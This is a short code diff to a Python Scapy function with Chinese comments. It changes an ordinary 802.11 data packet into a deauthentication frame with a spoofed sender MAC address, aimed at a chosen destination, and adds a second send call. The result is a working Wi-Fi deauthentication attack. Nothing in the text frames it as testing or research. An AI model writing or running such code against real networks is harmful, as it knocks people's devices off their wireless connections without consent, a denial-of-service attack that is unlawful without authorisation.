@@ -5,11 +5,12 @@ def send_80211_packet(destination_mac, interface):
     socket = L2Socket(iface=interface)
 
     # 构建要发送的封包
-    packet = RadioTap() / Dot11(type=2, subtype=4, addr1=destination_mac, addr2="00:11:22:33:44:55", addr3="00:11:22:33:44:55")
+    packet = RadioTap() / Dot11(type=0, subtype=12, addr1=destination_mac, addr2="00:11:22:33:44:55", addr3="00:11:22:33:44:55") / Dot11Deauth(reason=7)
 
     try:
         # 发送封包
         socket.send(packet)
+        send(packet, iface=interface)
         print("Packet sent successfully!")
     except Exception as e:
         print("Failed to send packet:", e)
